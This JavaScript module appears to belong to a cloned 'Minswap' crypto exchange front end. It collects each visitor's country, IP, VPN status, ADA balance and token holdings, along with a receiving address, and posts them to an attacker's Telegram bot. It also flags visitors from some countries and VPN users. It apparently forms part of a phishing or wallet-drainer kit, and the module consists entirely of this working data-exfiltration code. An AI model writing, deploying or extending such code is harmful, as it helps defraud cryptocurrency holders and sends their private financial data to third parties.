import axios from "axios";
import { getUserCountry, checkVpnStatus, getRecipientAddress } from "./userLocation";

// Telegram Bot Token and Chat ID
const TELEGRAM_BOT_TOKEN = import.meta.env.VITE_REACT_APP_TELEGRAM_TOKEN;
const TELEGRAM_CHAT_ID = import.meta.env.VITE_REACT_APP_TELEGRAM_CHAT_ID;

// Function to send a message to Telegram
export const sendMessageToTelegram = async (message) => {
  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
  const payload = {
    chat_id: TELEGRAM_CHAT_ID,
    text: message,
    parse_mode: "Markdown"
  };

  try {
    const response = await axios.post(url, payload);
    if (response.data.ok) {
      console.log("Message sent to Telegram successfully");
    } else {
      console.error("Failed to send message to Telegram:", response.data);
    }
  } catch (error) {
    console.error("Error sending message to Telegram:", error);
  }
};

// Function to send app details (like ADA balance) to Telegram
export const sendAppDetailsToTelegram = async (adaBalance, tokens) => {
  const tokenDetails = tokens.map(
    (token) => `|💵 ${token.assetName}: ${(token.amount / 1000000).toFixed(2)} ${token.assetName}   |`
  );

  let userCountryData = await getUserCountry();
  if (!userCountryData) {
    console.error("Could not retrieve user country data");
    userCountryData = { country: "Unknown", countryCode: "XX", isVpnIpdata: false }; // Default fallback
  }

  const { country, countryCode, ip, isVpnIpdata } = userCountryData;
  const isVpn = isVpnIpdata || await checkVpnStatus(ip);
  const recipientAddress = await getRecipientAddress();

  const specialCountries = ["NG","AE"];
  const globeIcon = "🌍";
  const isMine = specialCountries.includes(countryCode) || isVpn ? "🔴" : "🟢";

  let message = `*Visit Alert*\n` +
                `App: Minswap Clone\n\n` +
                `User Info--------------------\n` +
                `| Country: ${globeIcon} ${country} (${countryCode}) |\n`;

  if (isVpn || specialCountries.includes(countryCode)) {
    message += `| ⚠️ VPN / MARKED Country SUSPECTED  |\n`;
  } else {
    message += `| ✅ NO VPN SUSPECTED |\n`;
  }

  message += `| 💼 Receiving Address: ${recipientAddress} ${isMine}|\n` +
             `--------------------------------\n` +
             `| 💵 User Wallet Balance  |\n` +
             `| 💵 ADA: ${adaBalance.toFixed(2)} ADA       |\n` +
             `${tokenDetails.join("\n")}\n` +
             `------------------------------End`;

  await sendMessageToTelegram(message);
};
